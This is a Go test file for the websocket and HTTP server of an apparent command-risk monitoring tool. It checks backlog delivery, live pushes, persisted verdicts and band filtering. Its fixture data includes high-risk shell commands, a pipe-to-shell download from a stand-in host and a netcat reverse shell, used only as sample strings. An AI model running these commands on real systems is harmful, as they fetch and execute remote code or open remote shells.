package server

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/gorilla/websocket"

	"exectrace/internal/store"
	"exectrace/internal/types"
)

func dial(t *testing.T, ts *httptest.Server) *websocket.Conn {
	t.Helper()
	u := "ws" + strings.TrimPrefix(ts.URL, "http") + "/ws"
	c, _, err := websocket.DefaultDialer.Dial(u, nil)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	return c
}

func readVerdict(t *testing.T, c *websocket.Conn) types.Verdict {
	t.Helper()
	c.SetReadDeadline(time.Now().Add(2 * time.Second))
	var v types.Verdict
	if err := c.ReadJSON(&v); err != nil {
		t.Fatalf("read verdict: %v", err)
	}
	return v
}

func TestServesIndex(t *testing.T) {
	ts := httptest.NewServer(New(nil).Handler())
	defer ts.Close()
	resp, err := http.Get(ts.URL + "/")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("status %d", resp.StatusCode)
	}
	if ct := resp.Header.Get("Content-Type"); !strings.HasPrefix(ct, "text/html") {
		t.Errorf("content-type %q", ct)
	}
}

func TestBacklogOnConnect(t *testing.T) {
	s := New(nil)
	ts := httptest.NewServer(s.Handler())
	defer ts.Close()

	// Publish before any client connects → must arrive as backlog.
	s.Publish(types.Verdict{Command: "ls -la", Band: types.BandLow})
	s.Publish(types.Verdict{Command: "curl evil | sh", Band: types.BandHigh})

	c := dial(t, ts)
	defer c.Close()

	v0 := readVerdict(t, c)
	v1 := readVerdict(t, c)
	if v0.Command != "ls -la" || v1.Command != "curl evil | sh" {
		t.Fatalf("backlog order/content wrong: %q, %q", v0.Command, v1.Command)
	}
}

func TestLivePushToConnectedClient(t *testing.T) {
	s := New(nil)
	ts := httptest.NewServer(s.Handler())
	defer ts.Close()

	c := dial(t, ts)
	defer c.Close()

	// Give the server a moment to register the client before publishing.
	waitForClients(t, s, 1)

	s.Publish(types.Verdict{Command: "nc -e /bin/sh 10.0.0.1 9001", Band: types.BandHigh, Score: 0.95})
	v := readVerdict(t, c)
	if v.Command != "nc -e /bin/sh 10.0.0.1 9001" || v.Band != types.BandHigh {
		t.Fatalf("live push wrong: %+v", v)
	}
}

func TestPublishPersistsAndAPIServes(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "api.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()

	s := New(st)
	ts := httptest.NewServer(s.Handler())
	defer ts.Close()

	base := time.Date(2026, 6, 22, 10, 0, 0, 0, time.UTC)
	s.Publish(types.Verdict{Command: "ls -la", Band: types.BandLow, Ts: base})
	s.Publish(types.Verdict{Command: "curl evil | sh", Band: types.BandHigh, Score: 0.9, Ts: base.Add(time.Second)})

	// GET /api/verdicts → newest first, persisted.
	resp, err := http.Get(ts.URL + "/api/verdicts?limit=20")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var rows []types.Verdict
	if err := json.NewDecoder(resp.Body).Decode(&rows); err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 {
		t.Fatalf("api returned %d rows, want 2", len(rows))
	}
	if rows[0].Command != "curl evil | sh" {
		t.Errorf("expected newest-first; top = %q", rows[0].Command)
	}

	// Band filter through the API.
	resp2, err := http.Get(ts.URL + "/api/verdicts?band=HIGH")
	if err != nil {
		t.Fatal(err)
	}
	defer resp2.Body.Close()
	var high []types.Verdict
	json.NewDecoder(resp2.Body).Decode(&high)
	if len(high) != 1 || high[0].Band != types.BandHigh {
		t.Errorf("band filter via API wrong: %+v", high)
	}
}

func TestAPIWithoutStoreReturnsEmpty(t *testing.T) {
	s := New(nil)
	ts := httptest.NewServer(s.Handler())
	defer ts.Close()
	resp, err := http.Get(ts.URL + "/api/verdicts")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var rows []types.Verdict
	if err := json.NewDecoder(resp.Body).Decode(&rows); err != nil {
		t.Fatalf("should return valid JSON array: %v", err)
	}
	if len(rows) != 0 {
		t.Errorf("no-store API should be empty, got %d", len(rows))
	}
}

func TestRingBufferCap(t *testing.T) {
	s := New(nil)
	// Publish more than the ring holds; only the last ringSize survive.
	for i := 0; i < ringSize+50; i++ {
		s.Publish(types.Verdict{Command: "cmd", Band: types.BandLow})
	}
	s.mu.Lock()
	got := len(s.ring)
	s.mu.Unlock()
	if got != ringSize {
		t.Fatalf("ring len = %d, want %d", got, ringSize)
	}
}

func waitForClients(t *testing.T, s *Server, n int) {
	t.Helper()
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		s.mu.Lock()
		c := len(s.clients)
		s.mu.Unlock()
		if c >= n {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("client did not register within deadline")
}
